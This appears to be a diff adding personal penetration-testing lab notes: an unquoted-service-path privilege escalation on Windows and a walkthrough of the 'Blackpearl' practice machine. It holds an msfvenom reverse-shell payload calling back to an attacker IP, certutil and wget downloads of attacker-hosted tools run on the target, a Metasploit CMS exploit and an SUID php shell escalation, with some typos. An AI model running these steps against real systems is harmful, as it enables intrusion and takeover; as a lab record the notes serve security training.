@@ -169,6 +169,77 @@ $python3 -m http.server 80
 in target machine:
 
 $certutil.exe -urlcache -f 192.168.138.131/winpeas.exe winpeas.exe
+$winpeas.exe
+
+exploiting unenquoted path in the c drive of the windows system
+
+Attacker machine
+$msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.138.131 LPORT=7777 -f exe > wise.exe
+$python3 -m http.server 80
+
+get into c drive/wise file
+
+$certutil -urlcache -f http://192.168.138.131/wise.exe wise.exe
+
+to stop wisebootassistant
+$sc stop WiseBootAssistant 
+$sc query wisebootAssistant
+
+$start wisebootassistant
+
+we will get the system
+
+----------------------------------------------------WALKTHROUGH - BLACKPERL-----------------------------------------------
+VULN MACHINE : 192.168.138.130
+
+$nmap -T4 -A -p- 192.168.138.130
+
+open ports:(22,53,80)
+
+80 -nignx 
+
+$ffuf -w wordlist:fuzz -u http://192.168.138.130/FUZZ
+
+$dnsrecon -r 127.0.01/24 -n 192.168.138.130 -d domain
+
+dns ptr blackpearl.tcm
+
+$nano /etc/hosts
+
+creating dns for blackpearl.tcm
+
+now go to blackpearl.tcm
+
+$ffuf -w wordlist:fuzz -u http://blackpearl.tcm/FUZZ
+
+navigate cms 2.8 exploit using metasploit
+
+got meterpreter  
+
+$shell
+
+netsec.ws (spawning a TTY shell)
+
+copy the python code
+
+in attacker machine:
+$python3 -m http.server 80
+
+target machine:
+
+$cd /tmp
+$weget http://192.168.138.131/linpeas.sh linepeas.sh
+$chmod +x linpeas.sh
+$./linpeas.sh
+
+suid found
+gtfobins website
+
+$/usr/bin/php7.3 (code for shell)
+
+Got the flag
+--------------------------------------------------------------------------------------------------------------------
+
 
 
 
